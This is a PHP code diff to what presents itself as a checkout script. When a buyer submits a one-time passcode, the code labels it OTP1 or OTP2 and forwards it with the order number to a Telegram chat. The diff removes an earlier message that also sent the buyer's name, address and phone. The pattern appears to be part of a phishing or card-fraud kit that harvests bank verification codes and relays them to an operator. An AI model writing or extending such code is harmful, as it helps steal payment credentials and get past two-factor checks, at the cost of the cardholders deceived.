@@ -136,21 +136,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'
                 $stmtOffer->execute(['id' => $order['offer_id']]);
                 $offer = $stmtOffer->fetch(PDO::FETCH_ASSOC);
                 if ($offer) {
+                    $otpLabel = $slot === 2 ? 'OTP2' : 'OTP1';
+                    $otpValueSent = $slot === 2 ? trim((string) $order['otp2']) : trim((string) $order['otp']);
                     $messageLines = [
-                        'New checkout order #' . $order['id'],
-                        'Offer: ' . $offer['name'] . ' (' . $offer['duration'] . ')',
-                        'Price: $' . formatCurrency((float) $offer['price']),
-                        'Contact: ' . trim((string) $order['contact']),
-                        'Newsletter: ' . ($order['newsletter'] ? 'Yes' : 'No'),
-                        'Delivery: ' . trim((string) $order['delivery']),
-                        'Name: ' . trim((string) $order['first_name']) . ' ' . trim((string) $order['last_name']),
-                        'Company: ' . trim((string) $order['company']),
-                        'Address: ' . trim((string) $order['address']),
-                        'Apartment: ' . trim((string) $order['apartment']),
-                        'City/State: ' . trim((string) $order['city']) . ' / ' . trim((string) $order['state']),
-                        'Country/ZIP: ' . trim((string) $order['country']) . ' / ' . trim((string) $order['zip']),
-                        'Phone: ' . trim((string) $order['phone']),
-                        'OTP: ' . trim((string) $order['otp']) . ($order['otp2'] ? ' / ' . trim((string) $order['otp2']) : ''),
+                        'OTP update for order #' . $order['id'],
+                        $otpLabel . ': ' . $otpValueSent,
                     ];
                     $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
                     sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
